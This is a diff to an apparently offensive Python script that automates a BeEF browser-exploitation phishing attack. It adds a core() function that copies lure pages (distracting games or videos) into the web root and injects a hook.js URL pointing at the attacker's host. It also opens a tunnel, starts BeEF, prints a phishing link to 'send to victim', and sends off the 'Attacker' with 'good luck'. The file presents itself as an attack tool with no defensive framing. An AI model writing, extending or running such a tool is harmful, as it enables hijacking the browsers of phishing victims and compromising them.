@@ -4,6 +4,22 @@ import sys
 import time
 import signal
 
+def core():
+    os.system('sudo cp -r Core/* /var/www/html')
+    inplace_change('/var/www/html/index.html', 'beefip', x)
+    cloudflare()
+    startbeef()
+    inplace_change('/var/www/html/beef.js', 'youhacker55', "http://" + z + ":80/hook.js")
+    inplace_change('/var/www/html/beef.js', 'youhacker2', z)
+    print(Green + "this url for beef Panel: http://" + z + "/ui/panel")
+    print(Green + "getting phsihing link")
+    time.sleep(5)
+    print(Green + "sendthis to victim: http://" + x)
+    spoofurl()
+    print(Green + "good luck :) Attacker")
+    print(Red + "type CRTL + C if you want to exit")
+    signal.pause()
+
 def Deletezombie():
     delete = input(Red+ "are you sure you want to delete your zombies:")
     if delete == 'yes':
@@ -208,7 +224,8 @@ try:
     Availble WebPages
     1) SuperMario (will Add more maybe)
     2) Use WebPage that you can Put YT Vid on it to distract target
-    3) just start beef for me and forward ports
+    3) another game to distract the target
+    4) just start beef for me and forward ports
     d) Delete all beef Zombies
 
     """)
@@ -232,6 +249,9 @@ try:
         ytbvid()
     elif b == 'd':
         Deletezombie()
+    elif b == "3":
+        core()
+
 
 
     else:
